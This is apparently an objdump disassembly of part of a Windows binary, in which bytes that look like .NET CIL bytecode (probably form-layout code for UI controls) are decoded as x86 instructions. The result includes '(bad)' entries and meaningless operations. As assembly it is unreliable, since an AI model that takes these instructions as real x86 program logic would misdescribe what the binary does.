  402ffd:	0a 03                	or     (%ebx),%al
  402fff:	7b 2f                	jnp    0x403030
  403001:	00 00                	add    %al,(%eax)
  403003:	04 72                	add    $0x72,%al
  403005:	01 00                	add    %eax,(%eax)
  403007:	00 70 6f             	add    %dh,0x6f(%eax)
  40300a:	30 00                	xor    %al,(%eax)
  40300c:	00 0a                	add    %cl,(%edx)
  40300e:	02 28                	add    (%eax),%ch
  403010:	39 00                	cmp    %eax,(%eax)
  403012:	00 0a                	add    %cl,(%edx)
  403014:	03 7b 2f             	add    0x2f(%ebx),%edi
  403017:	00 00                	add    %al,(%eax)
  403019:	04 6f                	add    $0x6f,%al
  40301b:	3a 00                	cmp    (%eax),%al
  40301d:	00 0a                	add    %cl,(%edx)
  40301f:	03 73 2d             	add    0x2d(%ebx),%esi
  403022:	00 00                	add    %al,(%eax)
  403024:	0a 7d 30             	or     0x30(%ebp),%bh
  403027:	00 00                	add    %al,(%eax)
  403029:	04 03                	add    $0x3,%al
  40302b:	7b 30                	jnp    0x40305d
  40302d:	00 00                	add    %al,(%eax)
  40302f:	04 1f                	add    $0x1f,%al
  403031:	19 6f 86             	sbb    %ebp,-0x7a(%edi)
  403034:	00 00                	add    %al,(%eax)
  403036:	0a 03                	or     (%ebx),%al
  403038:	7b 30                	jnp    0x40306a
  40303a:	00 00                	add    %al,(%eax)
  40303c:	04 1f                	add    $0x1f,%al
  40303e:	68 04 5a 1f 1a       	push   $0x1a1f5a04
  403043:	58                   	pop    %eax
  403044:	6f                   	outsl  %ds:(%esi),(%dx)
  403045:	87 00                	xchg   %eax,(%eax)
  403047:	00 0a                	add    %cl,(%edx)
  403049:	03 7b 30             	add    0x30(%ebx),%edi
  40304c:	00 00                	add    %al,(%eax)
  40304e:	04 20                	add    $0x20,%al
  403050:	f8                   	clc
  403051:	02 00                	add    (%eax),%al
  403053:	00 6f 5a             	add    %ch,0x5a(%edi)
  403056:	00 00                	add    %al,(%eax)
  403058:	0a 03                	or     (%ebx),%al
  40305a:	7b 30                	jnp    0x40308c
  40305c:	00 00                	add    %al,(%eax)
  40305e:	04 1f                	add    $0x1f,%al
  403060:	10 6f 59             	adc    %ch,0x59(%edi)
  403063:	00 00                	add    %al,(%eax)
  403065:	0a 03                	or     (%ebx),%al
  403067:	7b 30                	jnp    0x403099
  403069:	00 00                	add    %al,(%eax)
  40306b:	04 72                	add    $0x72,%al
  40306d:	01 00                	add    %eax,(%eax)
  40306f:	00 70 6f             	add    %dh,0x6f(%eax)
  403072:	30 00                	xor    %al,(%eax)
  403074:	00 0a                	add    %cl,(%edx)
  403076:	02 28                	add    (%eax),%ch
  403078:	39 00                	cmp    %eax,(%eax)
  40307a:	00 0a                	add    %cl,(%edx)
  40307c:	03 7b 30             	add    0x30(%ebx),%edi
  40307f:	00 00                	add    %al,(%eax)
  403081:	04 6f                	add    $0x6f,%al
  403083:	3a 00                	cmp    (%eax),%al
  403085:	00 0a                	add    %cl,(%edx)
  403087:	03 73 8b             	add    -0x75(%ebx),%esi
  40308a:	00 00                	add    %al,(%eax)
  40308c:	0a 7d 31             	or     0x31(%ebp),%bh
  40308f:	00 00                	add    %al,(%eax)
  403091:	04 03                	add    $0x3,%al
  403093:	7b 31                	jnp    0x4030c6
  403095:	00 00                	add    %al,(%eax)
  403097:	04 16                	add    $0x16,%al
  403099:	6f                   	outsl  %ds:(%esi),(%dx)
  40309a:	84 00                	test   %al,(%eax)
  40309c:	00 0a                	add    %cl,(%edx)
  40309e:	03 7b 31             	add    0x31(%ebx),%edi
  4030a1:	00 00                	add    %al,(%eax)
  4030a3:	04 16                	add    $0x16,%al
  4030a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4030a6:	8c 00                	mov    %es,(%eax)
  4030a8:	00 0a                	add    %cl,(%edx)
  4030aa:	03 7b 31             	add    0x31(%ebx),%edi
  4030ad:	00 00                	add    %al,(%eax)
  4030af:	04 02                	add    $0x2,%al
  4030b1:	02 7b 29             	add    0x29(%ebx),%bh
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	04 28                	add    $0x28,%al
  4030b8:	2c 00                	sub    $0x0,%al
  4030ba:	00 06                	add    %al,(%esi)
  4030bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4030bd:	8d 00                	lea    (%eax),%eax
  4030bf:	00 0a                	add    %cl,(%edx)
  4030c1:	03 7b 36             	add    0x36(%ebx),%edi
  4030c4:	00 00                	add    %al,(%eax)
  4030c6:	04 1f                	add    $0x1f,%al
  4030c8:	0f 2f 3a             	comiss (%edx),%xmm7
  4030cb:	03 7b 31             	add    0x31(%ebx),%edi
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	04 20                	add    $0x20,%al
  4030d2:	e4 02                	in     $0x2,%al
  4030d4:	00 00                	add    %al,(%eax)
  4030d6:	1f                   	pop    %ds
  4030d7:	1e                   	push   %ds
  4030d8:	03 7b 36             	add    0x36(%ebx),%edi
  4030db:	00 00                	add    %al,(%eax)
  4030dd:	04 5a                	add    $0x5a,%al
  4030df:	59                   	pop    %ecx
  4030e0:	1f                   	pop    %ds
  4030e1:	14 73                	adc    $0x73,%al
  4030e3:	36 00 00             	add    %al,%ss:(%eax)
  4030e6:	0a 6f 8e             	or     -0x72(%edi),%ch
  4030e9:	00 00                	add    %al,(%eax)
  4030eb:	0a 03                	or     (%ebx),%al
  4030ed:	7b 31                	jnp    0x403120
  4030ef:	00 00                	add    %al,(%eax)
  4030f1:	04 1f                	add    $0x1f,%al
  4030f3:	19 1f                	sbb    %ebx,(%edi)
  4030f5:	1e                   	push   %ds
  4030f6:	03 7b 36             	add    0x36(%ebx),%edi
  4030f9:	00 00                	add    %al,(%eax)
  4030fb:	04 5a                	add    $0x5a,%al
  4030fd:	58                   	pop    %eax
  4030fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4030ff:	86 00                	xchg   %al,(%eax)
  403101:	00 0a                	add    %cl,(%edx)
  403103:	2b 27                	sub    (%edi),%esp
  403105:	03 7b 31             	add    0x31(%ebx),%edi
  403108:	00 00                	add    %al,(%eax)
  40310a:	04 20                	add    $0x20,%al
  40310c:	22 01                	and    (%ecx),%al
  40310e:	00 00                	add    %al,(%eax)
  403110:	1f                   	pop    %ds
  403111:	14 73                	adc    $0x73,%al
  403113:	36 00 00             	add    %al,%ss:(%eax)
  403116:	0a 6f 8e             	or     -0x72(%edi),%ch
  403119:	00 00                	add    %al,(%eax)
  40311b:	0a 03                	or     (%ebx),%al
  40311d:	7b 31                	jnp    0x403150
  40311f:	00 00                	add    %al,(%eax)
  403121:	04 20                	add    $0x20,%al
  403123:	db 01                	fildl  (%ecx)
  403125:	00 00                	add    %al,(%eax)
  403127:	6f                   	outsl  %ds:(%esi),(%dx)
  403128:	86 00                	xchg   %al,(%eax)
  40312a:	00 0a                	add    %cl,(%edx)
  40312c:	03 7b 31             	add    0x31(%ebx),%edi
  40312f:	00 00                	add    %al,(%eax)
  403131:	04 1f                	add    $0x1f,%al
  403133:	68 04 5a 1f 2f       	push   $0x2f1f5a04
  403138:	58                   	pop    %eax
  403139:	6f                   	outsl  %ds:(%esi),(%dx)
  40313a:	87 00                	xchg   %eax,(%eax)
  40313c:	00 0a                	add    %cl,(%edx)
  40313e:	02 28                	add    (%eax),%ch
  403140:	39 00                	cmp    %eax,(%eax)
  403142:	00 0a                	add    %cl,(%edx)
  403144:	03 7b 31             	add    0x31(%ebx),%edi
  403147:	00 00                	add    %al,(%eax)
  403149:	04 6f                	add    $0x6f,%al
  40314b:	3a 00                	cmp    (%eax),%al
  40314d:	00 0a                	add    %cl,(%edx)
  40314f:	03 73 2d             	add    0x2d(%ebx),%esi
  403152:	00 00                	add    %al,(%eax)
  403154:	0a 7d 32             	or     0x32(%ebp),%bh
  403157:	00 00                	add    %al,(%eax)
  403159:	04 03                	add    $0x3,%al
  40315b:	7b 32                	jnp    0x40318f
  40315d:	00 00                	add    %al,(%eax)
  40315f:	04 1b                	add    $0x1b,%al
  403161:	6f                   	outsl  %ds:(%esi),(%dx)
  403162:	86 00                	xchg   %al,(%eax)
  403164:	00 0a                	add    %cl,(%edx)
  403166:	03 7b 32             	add    0x32(%ebx),%edi
  403169:	00 00                	add    %al,(%eax)
  40316b:	04 1f                	add    $0x1f,%al
  40316d:	68 04 5a 1f 48       	push   $0x481f5a04
  403172:	58                   	pop    %eax
  403173:	6f                   	outsl  %ds:(%esi),(%dx)
  403174:	87 00                	xchg   %eax,(%eax)
  403176:	00 0a                	add    %cl,(%edx)
  403178:	03 7b 32             	add    0x32(%ebx),%edi
  40317b:	00 00                	add    %al,(%eax)
  40317d:	04 20                	add    $0x20,%al
  40317f:	0c 03                	or     $0x3,%al
  403181:	00 00                	add    %al,(%eax)
  403183:	6f                   	outsl  %ds:(%esi),(%dx)
  403184:	5a                   	pop    %edx
  403185:	00 00                	add    %al,(%eax)
  403187:	0a 03                	or     (%ebx),%al
  403189:	7b 32                	jnp    0x4031bd
  40318b:	00 00                	add    %al,(%eax)
  40318d:	04 1f                	add    $0x1f,%al
  40318f:	10 6f 59             	adc    %ch,0x59(%edi)
  403192:	00 00                	add    %al,(%eax)
  403194:	0a 03                	or     (%ebx),%al
  403196:	7b 32                	jnp    0x4031ca
  403198:	00 00                	add    %al,(%eax)
  40319a:	04 72                	add    $0x72,%al
  40319c:	01 00                	add    %eax,(%eax)
  40319e:	00 70 6f             	add    %dh,0x6f(%eax)
  4031a1:	30 00                	xor    %al,(%eax)
  4031a3:	00 0a                	add    %cl,(%edx)
  4031a5:	02 28                	add    (%eax),%ch
  4031a7:	39 00                	cmp    %eax,(%eax)
  4031a9:	00 0a                	add    %cl,(%edx)
  4031ab:	03 7b 32             	add    0x32(%ebx),%edi
  4031ae:	00 00                	add    %al,(%eax)
  4031b0:	04 6f                	add    $0x6f,%al
  4031b2:	3a 00                	cmp    (%eax),%al
  4031b4:	00 0a                	add    %cl,(%edx)
  4031b6:	03 73 2d             	add    0x2d(%ebx),%esi
  4031b9:	00 00                	add    %al,(%eax)
  4031bb:	0a 7d 33             	or     0x33(%ebp),%bh
  4031be:	00 00                	add    %al,(%eax)
  4031c0:	04 03                	add    $0x3,%al
  4031c2:	7b 33                	jnp    0x4031f7
  4031c4:	00 00                	add    %al,(%eax)
  4031c6:	04 1f                	add    $0x1f,%al
  4031c8:	19 6f 86             	sbb    %ebp,-0x7a(%edi)
  4031cb:	00 00                	add    %al,(%eax)
  4031cd:	0a 03                	or     (%ebx),%al
  4031cf:	7b 33                	jnp    0x403204
  4031d1:	00 00                	add    %al,(%eax)
  4031d3:	04 1f                	add    $0x1f,%al
  4031d5:	68 04 5a 1f 58       	push   $0x581f5a04
  4031da:	58                   	pop    %eax
  4031db:	6f                   	outsl  %ds:(%esi),(%dx)
  4031dc:	87 00                	xchg   %eax,(%eax)
  4031de:	00 0a                	add    %cl,(%edx)
  4031e0:	03 7b 33             	add    0x33(%ebx),%edi
  4031e3:	00 00                	add    %al,(%eax)
  4031e5:	04 20                	add    $0x20,%al
  4031e7:	f8                   	clc
  4031e8:	02 00                	add    (%eax),%al
  4031ea:	00 6f 5a             	add    %ch,0x5a(%edi)
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	0a 03                	or     (%ebx),%al
  4031f1:	7b 33                	jnp    0x403226
  4031f3:	00 00                	add    %al,(%eax)
  4031f5:	04 1f                	add    $0x1f,%al
  4031f7:	10 6f 59             	adc    %ch,0x59(%edi)
  4031fa:	00 00                	add    %al,(%eax)
  4031fc:	0a 03                	or     (%ebx),%al
  4031fe:	7b 33                	jnp    0x403233
  403200:	00 00                	add    %al,(%eax)
  403202:	04 72                	add    $0x72,%al
  403204:	01 00                	add    %eax,(%eax)
  403206:	00 70 6f             	add    %dh,0x6f(%eax)
  403209:	30 00                	xor    %al,(%eax)
  40320b:	00 0a                	add    %cl,(%edx)
  40320d:	02 28                	add    (%eax),%ch
  40320f:	39 00                	cmp    %eax,(%eax)
  403211:	00 0a                	add    %cl,(%edx)
  403213:	03 7b 33             	add    0x33(%ebx),%edi
  403216:	00 00                	add    %al,(%eax)
  403218:	04 6f                	add    $0x6f,%al
  40321a:	3a 00                	cmp    (%eax),%al
  40321c:	00 0a                	add    %cl,(%edx)
  40321e:	2a 32                	sub    (%edx),%dh
  403220:	02 7b 2e             	add    0x2e(%ebx),%bh
  403223:	00 00                	add    %al,(%eax)
  403225:	04 6f                	add    $0x6f,%al
  403227:	8f 00                	pop    (%eax)
  403229:	00 0a                	add    %cl,(%edx)
  40322b:	2a e2                	sub    %dl,%ah
  40322d:	02 19                	add    (%ecx),%bl
  40322f:	7d 29                	jge    0x40325a
  403231:	00 00                	add    %al,(%eax)
  403233:	04 02                	add    $0x2,%al
  403235:	73 90                	jae    0x4031c7
  403237:	00 00                	add    %al,(%eax)
  403239:	0a 7d 2a             	or     0x2a(%ebp),%bh
  40323c:	00 00                	add    %al,(%eax)
  40323e:	04 02                	add    $0x2,%al
  403240:	15 7d 2b 00 00       	adc    $0x2b7d,%eax
  403245:	04 02                	add    $0x2,%al
  403247:	15 7d 2c 00 00       	adc    $0x2c7d,%eax
  40324c:	04 02                	add    $0x2,%al
  40324e:	73 91                	jae    0x4031e1
  403250:	00 00                	add    %al,(%eax)
  403252:	0a 7d 2e             	or     0x2e(%ebp),%bh
  403255:	00 00                	add    %al,(%eax)
  403257:	04 02                	add    $0x2,%al
  403259:	28 18                	sub    %bl,(%eax)
  40325b:	00 00                	add    %al,(%eax)
  40325d:	0a 02                	or     (%edx),%al
  40325f:	28 2d 00 00 06 2a    	sub    %ch,0x2a060000
  403265:	fe 02                	incb   (%edx)
  403267:	19 7d 29             	sbb    %edi,0x29(%ebp)
  40326a:	00 00                	add    %al,(%eax)
  40326c:	04 02                	add    $0x2,%al
  40326e:	73 90                	jae    0x403200
  403270:	00 00                	add    %al,(%eax)
  403272:	0a 7d 2a             	or     0x2a(%ebp),%bh
  403275:	00 00                	add    %al,(%eax)
  403277:	04 02                	add    $0x2,%al
  403279:	15 7d 2b 00 00       	adc    $0x2b7d,%eax
  40327e:	04 02                	add    $0x2,%al
  403280:	15 7d 2c 00 00       	adc    $0x2c7d,%eax
  403285:	04 02                	add    $0x2,%al
  403287:	73 91                	jae    0x40321a
  403289:	00 00                	add    %al,(%eax)
  40328b:	0a 7d 2e             	or     0x2e(%ebp),%bh
  40328e:	00 00                	add    %al,(%eax)
  403290:	04 02                	add    $0x2,%al
  403292:	28 18                	sub    %bl,(%eax)
  403294:	00 00                	add    %al,(%eax)
  403296:	0a 02                	or     (%edx),%al
  403298:	03 7d 29             	add    0x29(%ebp),%edi
  40329b:	00 00                	add    %al,(%eax)
  40329d:	04 02                	add    $0x2,%al
  40329f:	28 2d 00 00 06 2a    	sub    %ch,0x2a060000
  4032a5:	00 00                	add    %al,(%eax)
  4032a7:	00 13                	add    %dl,(%ebx)
  4032a9:	30 06                	xor    %al,(%esi)
  4032ab:	00 3a                	add    %bh,(%edx)
  4032ad:	08 00                	or     %al,(%eax)
  4032af:	00 0a                	add    %cl,(%edx)
  4032b1:	00 00                	add    %al,(%eax)
  4032b3:	11 03                	adc    %eax,(%ebx)
  4032b5:	2d 01 2a 15 0a       	sub    $0xa152a01,%eax
  4032ba:	16                   	push   %ss
  4032bb:	0b 2b                	or     (%ebx),%ebp
  4032bd:	21 02                	and    %eax,(%edx)
  4032bf:	7b 2e                	jnp    0x4032ef
  4032c1:	00 00                	add    %al,(%eax)
  4032c3:	04 07                	add    $0x7,%al
  4032c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c6:	83 00 00             	addl   $0x0,(%eax)
  4032c9:	0a 7b 34             	or     0x34(%ebx),%bh
  4032cc:	00 00                	add    %al,(%eax)
  4032ce:	04 03                	add    $0x3,%al
  4032d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4032d1:	92                   	xchg   %eax,%edx
  4032d2:	00 00                	add    %al,(%eax)
  4032d4:	0a 33                	or     (%ebx),%dh
  4032d6:	04 07                	add    $0x7,%al
  4032d8:	0a 2b                	or     (%ebx),%ch
  4032da:	12 07                	adc    (%edi),%al
  4032dc:	17                   	pop    %ss
  4032dd:	58                   	pop    %eax
  4032de:	0b 07                	or     (%edi),%eax
  4032e0:	02 7b 2e             	add    0x2e(%ebx),%bh
  4032e3:	00 00                	add    %al,(%eax)
  4032e5:	04 6f                	add    $0x6f,%al
  4032e7:	8f 00                	pop    (%eax)
  4032e9:	00 0a                	add    %cl,(%edx)
  4032eb:	32 d1                	xor    %cl,%dl
  4032ed:	03 6f 93             	add    -0x6d(%edi),%ebp
  4032f0:	00 00                	add    %al,(%eax)
  4032f2:	0a 17                	or     (%edi),%dl
  4032f4:	40                   	inc    %eax
  4032f5:	c1 02 00             	roll   $0x0,(%edx)
  4032f8:	00 06                	add    %al,(%esi)
  4032fa:	16                   	push   %ss
  4032fb:	3f                   	aas
  4032fc:	16                   	push   %ss
  4032fd:	01 00                	add    %eax,(%eax)
  4032ff:	00 02                	add    %al,(%edx)
  403301:	7b 2b                	jnp    0x40332e
  403303:	00 00                	add    %al,(%eax)
  403305:	04 06                	add    $0x6,%al
  403307:	33 07                	xor    (%edi),%eax
  403309:	02 15 7d 2b 00 00    	add    0x2b7d,%dl
  40330f:	04 02                	add    $0x2,%al
  403311:	28 39                	sub    %bh,(%ecx)
  403313:	00 00                	add    %al,(%eax)
  403315:	0a 02                	or     (%edx),%al
  403317:	7b 2e                	jnp    0x403347
  403319:	00 00                	add    %al,(%eax)
  40331b:	04 06                	add    $0x6,%al
  40331d:	6f                   	outsl  %ds:(%esi),(%dx)
  40331e:	83 00 00             	addl   $0x0,(%eax)
  403321:	0a 7b 2f             	or     0x2f(%ebx),%bh
  403324:	00 00                	add    %al,(%eax)
  403326:	04 6f                	add    $0x6f,%al
  403328:	94                   	xchg   %eax,%esp
  403329:	00 00                	add    %al,(%eax)
  40332b:	0a 02                	or     (%edx),%al
  40332d:	28 39                	sub    %bh,(%ecx)
  40332f:	00 00                	add    %al,(%eax)
  403331:	0a 02                	or     (%edx),%al
  403333:	7b 2e                	jnp    0x403363
  403335:	00 00                	add    %al,(%eax)
  403337:	04 06                	add    $0x6,%al
  403339:	6f                   	outsl  %ds:(%esi),(%dx)
  40333a:	83 00 00             	addl   $0x0,(%eax)
  40333d:	0a 7b 30             	or     0x30(%ebx),%bh
  403340:	00 00                	add    %al,(%eax)
  403342:	04 6f                	add    $0x6f,%al
  403344:	94                   	xchg   %eax,%esp
  403345:	00 00                	add    %al,(%eax)
  403347:	0a 02                	or     (%edx),%al
  403349:	28 39                	sub    %bh,(%ecx)
  40334b:	00 00                	add    %al,(%eax)
  40334d:	0a 02                	or     (%edx),%al
  40334f:	7b 2e                	jnp    0x40337f
  403351:	00 00                	add    %al,(%eax)
  403353:	04 06                	add    $0x6,%al
  403355:	6f                   	outsl  %ds:(%esi),(%dx)
  403356:	83 00 00             	addl   $0x0,(%eax)
  403359:	0a 7b 31             	or     0x31(%ebx),%bh
  40335c:	00 00                	add    %al,(%eax)
  40335e:	04 6f                	add    $0x6f,%al
  403360:	94                   	xchg   %eax,%esp
  403361:	00 00                	add    %al,(%eax)
  403363:	0a 02                	or     (%edx),%al
  403365:	28 39                	sub    %bh,(%ecx)
  403367:	00 00                	add    %al,(%eax)
  403369:	0a 02                	or     (%edx),%al
  40336b:	7b 2e                	jnp    0x40339b
  40336d:	00 00                	add    %al,(%eax)
  40336f:	04 06                	add    $0x6,%al
  403371:	6f                   	outsl  %ds:(%esi),(%dx)
  403372:	83 00 00             	addl   $0x0,(%eax)
  403375:	0a 7b 32             	or     0x32(%ebx),%bh
  403378:	00 00                	add    %al,(%eax)
  40337a:	04 6f                	add    $0x6f,%al
  40337c:	94                   	xchg   %eax,%esp
  40337d:	00 00                	add    %al,(%eax)
  40337f:	0a 02                	or     (%edx),%al
  403381:	28 39                	sub    %bh,(%ecx)
  403383:	00 00                	add    %al,(%eax)
  403385:	0a 02                	or     (%edx),%al
  403387:	7b 2e                	jnp    0x4033b7
  403389:	00 00                	add    %al,(%eax)
  40338b:	04 06                	add    $0x6,%al
  40338d:	6f                   	outsl  %ds:(%esi),(%dx)
  40338e:	83 00 00             	addl   $0x0,(%eax)
  403391:	0a 7b 33             	or     0x33(%ebx),%bh
  403394:	00 00                	add    %al,(%eax)
  403396:	04 6f                	add    $0x6f,%al
  403398:	94                   	xchg   %eax,%esp
  403399:	00 00                	add    %al,(%eax)
  40339b:	0a 02                	or     (%edx),%al
  40339d:	7b 2e                	jnp    0x4033cd
  40339f:	00 00                	add    %al,(%eax)
  4033a1:	04 06                	add    $0x6,%al
  4033a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4033a4:	83 00 00             	addl   $0x0,(%eax)
  4033a7:	0a 7b 2f             	or     0x2f(%ebx),%bh
  4033aa:	00 00                	add    %al,(%eax)
  4033ac:	04 6f                	add    $0x6f,%al
  4033ae:	95                   	xchg   %eax,%ebp
  4033af:	00 00                	add    %al,(%eax)
  4033b1:	0a 02                	or     (%edx),%al
  4033b3:	7b 2e                	jnp    0x4033e3
  4033b5:	00 00                	add    %al,(%eax)
  4033b7:	04 06                	add    $0x6,%al
  4033b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ba:	83 00 00             	addl   $0x0,(%eax)
  4033bd:	0a 7b 30             	or     0x30(%ebx),%bh
  4033c0:	00 00                	add    %al,(%eax)
  4033c2:	04 6f                	add    $0x6f,%al
  4033c4:	95                   	xchg   %eax,%ebp
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	0a 02                	or     (%edx),%al
  4033c9:	7b 2e                	jnp    0x4033f9
  4033cb:	00 00                	add    %al,(%eax)
  4033cd:	04 06                	add    $0x6,%al
  4033cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4033d0:	83 00 00             	addl   $0x0,(%eax)
  4033d3:	0a 7b 31             	or     0x31(%ebx),%bh
  4033d6:	00 00                	add    %al,(%eax)
  4033d8:	04 6f                	add    $0x6f,%al
  4033da:	95                   	xchg   %eax,%ebp
  4033db:	00 00                	add    %al,(%eax)
  4033dd:	0a 02                	or     (%edx),%al
  4033df:	7b 2e                	jnp    0x40340f
  4033e1:	00 00                	add    %al,(%eax)
  4033e3:	04 06                	add    $0x6,%al
  4033e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4033e6:	83 00 00             	addl   $0x0,(%eax)
  4033e9:	0a 7b 32             	or     0x32(%ebx),%bh
  4033ec:	00 00                	add    %al,(%eax)
  4033ee:	04 6f                	add    $0x6f,%al
  4033f0:	95                   	xchg   %eax,%ebp
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	0a 02                	or     (%edx),%al
  4033f5:	7b 2e                	jnp    0x403425
  4033f7:	00 00                	add    %al,(%eax)
  4033f9:	04 06                	add    $0x6,%al
  4033fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4033fc:	83 00 00             	addl   $0x0,(%eax)
  4033ff:	0a 7b 33             	or     0x33(%ebx),%bh
  403402:	00 00                	add    %al,(%eax)
  403404:	04 6f                	add    $0x6f,%al
  403406:	95                   	xchg   %eax,%ebp
  403407:	00 00                	add    %al,(%eax)
  403409:	0a 02                	or     (%edx),%al
  40340b:	7b 2e                	jnp    0x40343b
  40340d:	00 00                	add    %al,(%eax)
  40340f:	04 06                	add    $0x6,%al
  403411:	6f                   	outsl  %ds:(%esi),(%dx)
  403412:	96                   	xchg   %eax,%esi
  403413:	00 00                	add    %al,(%eax)
  403415:	0a 02                	or     (%edx),%al
  403417:	7b 2e                	jnp    0x403447
  403419:	00 00                	add    %al,(%eax)
  40341b:	04 6f                	add    $0x6f,%al
  40341d:	8f 00                	pop    (%eax)
  40341f:	00 0a                	add    %cl,(%edx)
  403421:	2d 1d 02 7b 2a       	sub    $0x2a7b021d,%eax
  403426:	00 00                	add    %al,(%eax)
  403428:	04 6f                	add    $0x6f,%al
  40342a:	97                   	xchg   %eax,%edi
  40342b:	00 00                	add    %al,(%eax)
  40342d:	0a 02                	or     (%edx),%al
  40342f:	7b 2a                	jnp    0x40345b
  403431:	00 00                	add    %al,(%eax)
  403433:	04 6f                	add    $0x6f,%al
  403435:	95                   	xchg   %eax,%ebp
  403436:	00 00                	add    %al,(%eax)
  403438:	0a 02                	or     (%edx),%al
  40343a:	28 17                	sub    %dl,(%edi)
  40343c:	00 00                	add    %al,(%eax)
  40343e:	0a 2a                	or     (%edx),%ch
  403440:	06                   	push   %es
  403441:	16                   	push   %ss
  403442:	2f                   	das
  403443:	01 2a                	add    %ebp,(%edx)
  403445:	06                   	push   %es
  403446:	0c 38                	or     $0x38,%al
  403448:	95                   	xchg   %eax,%ebp
  403449:	00 00                	add    %al,(%eax)
  40344b:	00 02                	add    %al,(%edx)
  40344d:	7b 2e                	jnp    0x40347d
  40344f:	00 00                	add    %al,(%eax)
  403451:	04 08                	add    $0x8,%al
  403453:	6f                   	outsl  %ds:(%esi),(%dx)
  403454:	83 00 00             	addl   $0x0,(%eax)
  403457:	0a 7b 2f             	or     0x2f(%ebx),%bh
  40345a:	00 00                	add    %al,(%eax)
  40345c:	04 1f                	add    $0x1f,%al
  40345e:	68 08 5a 1f 0a       	push   $0xa1f5a08
  403463:	58                   	pop    %eax
  403464:	6f                   	outsl  %ds:(%esi),(%dx)
  403465:	87 00                	xchg   %eax,(%eax)
  403467:	00 0a                	add    %cl,(%edx)
  403469:	02 7b 2e             	add    0x2e(%ebx),%bh
  40346c:	00 00                	add    %al,(%eax)
  40346e:	04 08                	add    $0x8,%al
  403470:	6f                   	outsl  %ds:(%esi),(%dx)
  403471:	83 00 00             	addl   $0x0,(%eax)
  403474:	0a 7b 30             	or     0x30(%ebx),%bh
  403477:	00 00                	add    %al,(%eax)
  403479:	04 1f                	add    $0x1f,%al
  40347b:	68 08 5a 1f 1a       	push   $0x1a1f5a08
  403480:	58                   	pop    %eax
  403481:	6f                   	outsl  %ds:(%esi),(%dx)
  403482:	87 00                	xchg   %eax,(%eax)
  403484:	00 0a                	add    %cl,(%edx)
  403486:	02 7b 2e             	add    0x2e(%ebx),%bh
  403489:	00 00                	add    %al,(%eax)
  40348b:	04 08                	add    $0x8,%al
  40348d:	6f                   	outsl  %ds:(%esi),(%dx)
  40348e:	83 00 00             	addl   $0x0,(%eax)
  403491:	0a 7b 31             	or     0x31(%ebx),%bh
  403494:	00 00                	add    %al,(%eax)
  403496:	04 1f                	add    $0x1f,%al
  403498:	68 08 5a 1f 2f       	push   $0x2f1f5a08
  40349d:	58                   	pop    %eax
  40349e:	6f                   	outsl  %ds:(%esi),(%dx)
  40349f:	87 00                	xchg   %eax,(%eax)
  4034a1:	00 0a                	add    %cl,(%edx)
  4034a3:	02 7b 2e             	add    0x2e(%ebx),%bh
  4034a6:	00 00                	add    %al,(%eax)
  4034a8:	04 08                	add    $0x8,%al
  4034aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4034ab:	83 00 00             	addl   $0x0,(%eax)
  4034ae:	0a 7b 32             	or     0x32(%ebx),%bh
  4034b1:	00 00                	add    %al,(%eax)
  4034b3:	04 1f                	add    $0x1f,%al
  4034b5:	68 08 5a 1f 48       	push   $0x481f5a08
  4034ba:	58                   	pop    %eax
  4034bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4034bc:	87 00                	xchg   %eax,(%eax)
  4034be:	00 0a                	add    %cl,(%edx)
  4034c0:	02 7b 2e             	add    0x2e(%ebx),%bh
  4034c3:	00 00                	add    %al,(%eax)
  4034c5:	04 08                	add    $0x8,%al
  4034c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c8:	83 00 00             	addl   $0x0,(%eax)
  4034cb:	0a 7b 33             	or     0x33(%ebx),%bh
  4034ce:	00 00                	add    %al,(%eax)
  4034d0:	04 1f                	add    $0x1f,%al
  4034d2:	68 08 5a 1f 58       	push   $0x581f5a08
  4034d7:	58                   	pop    %eax
  4034d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4034d9:	87 00                	xchg   %eax,(%eax)
  4034db:	00 0a                	add    %cl,(%edx)
  4034dd:	08 17                	or     %dl,(%edi)
  4034df:	58                   	pop    %eax
  4034e0:	0c 08                	or     $0x8,%al
  4034e2:	02 7b 2e             	add    0x2e(%ebx),%bh
  4034e5:	00 00                	add    %al,(%eax)
  4034e7:	04 6f                	add    $0x6f,%al
  4034e9:	8f 00                	pop    (%eax)
  4034eb:	00 0a                	add    %cl,(%edx)
  4034ed:	3f                   	aas
  4034ee:	5a                   	pop    %edx
  4034ef:	ff                   	(bad)
  4034f0:	ff                   	(bad)
  4034f1:	ff 1f                	lcall  *(%edi)
  4034f3:	68 02 7b 2e 00       	push   $0x2e7b02
  4034f8:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4034fb:	8f 00                	pop    (%eax)
  4034fd:	00 0a                	add    %cl,(%edx)
  4034ff:	5a                   	pop    %edx
  403500:	1f                   	pop    %ds
  403501:	2b 58 02             	sub    0x2(%eax),%ebx
  403504:	28 33                	sub    %dh,(%ebx)
  403506:	00 00                	add    %al,(%eax)
  403508:	0a 6f 34             	or     0x34(%edi),%ch
  40350b:	00 00                	add    %al,(%eax)
  40350d:	0a 13                	or     (%ebx),%dl
  40350f:	0a 12                	or     (%edx),%dl
  403511:	0a 28                	or     (%eax),%ch
  403513:	98                   	cwtl
  403514:	00 00                	add    %al,(%eax)
  403516:	0a 30                	or     (%eax),%dh
  403518:	5d                   	pop    %ebp
  403519:	02 1f                	add    (%edi),%bl
  40351b:	68 02 7b 2e 00       	push   $0x2e7b02
  403520:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403523:	8f 00                	pop    (%eax)
  403525:	00 0a                	add    %cl,(%edx)
  403527:	5a                   	pop    %edx
